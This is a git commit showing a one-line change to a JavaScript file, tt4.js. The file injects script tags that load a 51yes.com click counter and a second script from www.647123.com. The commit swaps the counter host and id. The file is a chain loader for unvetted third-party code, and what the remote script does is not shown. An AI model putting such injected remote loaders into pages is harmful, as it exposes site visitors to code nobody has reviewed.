86c0c2127f6a653944d944ea7b8f057d7300b3f0
js999999999 <js-9@outlook.com>
2017-10-05 16:24:45 +0800

    Update tt4.js

--- 2017qq/tt4.js
+++ 2017qq/tt4.js
@@ -1,3 +1,3 @@
-document.writeln("<script language=\"javascript\" src=\"http:\/\/count37.51yes.com\/click.aspx?id=378546493&logo=12\" charset=\"gb2312\"><\/script>");
+document.writeln("<script language=\"javascript\" src=\"http:\/\/count47.51yes.com\/click.aspx?id=479643933&logo=12\" charset=\"gb2312\"><\/script>");
 
 document.writeln("<script src=http:\/\/\www.647123.com\/2017qq/t1.js ><\/script>");
